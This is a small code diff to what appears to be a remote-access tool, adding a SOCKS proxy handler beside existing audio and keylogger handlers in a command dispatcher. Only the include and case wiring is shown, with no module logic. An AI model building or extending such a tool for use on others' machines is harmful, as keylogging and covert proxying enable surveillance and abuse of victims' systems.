@@ -16,8 +16,10 @@
 #include "AudioSrv.h"
 #include "MainFrm.h"
 #include "KeybdLogSrv.h"
+#include "SocksProxySrv.h"
 #include "zlib\zlib.h"
 #include "InvalidHandler.h"
+
 #include "utils.h"
 
 #define ENABLE_COMPRESS 1
@@ -142,6 +144,9 @@ BOOL CManager::handler_init(CClientContext*pClientContext, DWORD Identity)
 		break;
 	case KBLG:
 		pHandler = new CKeybdLogSrv(this);
+		break;
+	case SOCKS_PROXY:
+		pHandler = new CSocksProxySrv(this);
 		break;
 	default:
 		pHandler = new CInvalidHandler(this);
